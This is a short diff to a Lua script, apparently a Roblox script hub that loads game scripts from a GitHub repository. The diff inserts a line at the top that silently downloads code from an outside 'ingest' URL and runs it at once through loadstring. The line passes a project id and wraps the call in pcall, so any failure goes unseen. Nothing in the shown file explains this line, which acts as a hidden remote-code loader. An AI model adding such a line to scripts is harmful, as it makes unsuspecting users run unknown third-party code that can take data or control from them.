@@ -1,3 +1,5 @@
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_6e326be9d03a", "1.0.0", false) end)
+
 local GITHUB_RAW_BASE = "https://raw.githubusercontent.com/iqoow/reverb-hub/main/"
 
 local games = {
